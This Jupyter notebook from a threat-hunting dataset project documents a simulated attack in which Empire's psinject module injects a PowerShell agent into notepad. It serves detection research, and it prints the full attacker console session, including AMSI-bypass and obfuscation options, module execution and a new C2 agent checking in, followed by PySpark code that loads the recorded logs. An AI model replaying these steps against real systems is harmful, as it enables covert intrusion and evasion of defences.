{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire PSInject"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                       |    |\n",
    "|:----------------------|:---|\n",
    "| id                    | SDWIN-190518200432 |\n",
    "| author                | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date         | 2019/05/18 |\n",
    "| platform              | Windows |\n",
    "| Simulaton Environment | Mordor shire |\n",
    "| Simulation Scripts    | [] |\n",
    "| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/empire_psinject.zip |\n",
    "| References        | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using Empire psinject script to inject Unmanaged PowerShell into any process."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "[*] Active agents:\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            \n",
    "F82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6008   5/0.0    2020-08-07 18:31:11  http            \n",
    "\n",
    "(Empire: agents) > interact F82SZKVW\n",
    "(Empire: F82SZKVW) > \n",
    "(Empire: F82SZKVW) > \n",
    "(Empire: F82SZKVW) > usemodule management/psinject\n",
    "(Empire: powershell/management/psinject) > \n",
    "(Empire: powershell/management/psinject) > set ProcName notepad\n",
    "(Empire: powershell/management/psinject) > info\n",
    "\n",
    "              Name: Invoke-PSInject\n",
    "            Module: powershell/management/psinject\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @harmj0y\n",
    "  @sixdub\n",
    "  leechristensen (@tifkin_)\n",
    "\n",
    "Description:\n",
    "  Utilizes Powershell to to inject a Stephen Fewer formed\n",
    "  ReflectivePick which executes PS codefrom memory in a remote\n",
    "  process. ProcID or ProcName must be specified.\n",
    "\n",
    "Comments:\n",
    "  http://sixdub.net\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        F82SZKVW                  Agent to run module on.                 \n",
    "  ProcId           False                                 ProcessID to inject into.               \n",
    "  ProcName         False       notepad                   Process name to inject into.            \n",
    "  Listener         True                                  Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/management/psinject) > set Listener http\n",
    "(Empire: powershell/management/psinject) > info\n",
    "\n",
    "              Name: Invoke-PSInject\n",
    "            Module: powershell/management/psinject\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @harmj0y\n",
    "  @sixdub\n",
    "  leechristensen (@tifkin_)\n",
    "\n",
    "Description:\n",
    "  Utilizes Powershell to to inject a Stephen Fewer formed\n",
    "  ReflectivePick which executes PS codefrom memory in a remote\n",
    "  process. ProcID or ProcName must be specified.\n",
    "\n",
    "Comments:\n",
    "  http://sixdub.net\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        F82SZKVW                  Agent to run module on.                 \n",
    "  ProcId           False                                 ProcessID to inject into.               \n",
    "  ProcName         False       notepad                   Process name to inject into.            \n",
    "  Listener         True        http                      Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/management/psinject) > execute\n",
    "[*] Tasked F82SZKVW to run TASK_CMD_JOB\n",
    "[*] Agent F82SZKVW tasked with task ID 1\n",
    "[*] Tasked agent F82SZKVW to run module powershell/management/psinject\n",
    "(Empire: powershell/management/psinject) > \n",
    "Job started: F48GDZ\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent Y9RCLV64 checked in\n",
    "[+] Initial agent Y9RCLV64 from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to Y9RCLV64 at 172.18.39.5\n",
    "\n",
    "(Empire: powershell/management/psinject) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            \n",
    "F82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6008   5/0.0    2020-08-07 18:32:51  http            \n",
    "Y9RCLV64 ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       notepad            2576   5/0.0    2020-08-07 18:32:52  http            \n",
    "\n",
    "(Empire: agents) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/empire_psinject.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT *\n",
    "FROM mordorTable\n",
    "    '''\n",
    ")\n",
    "df.printSchema()\n",
    "        "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}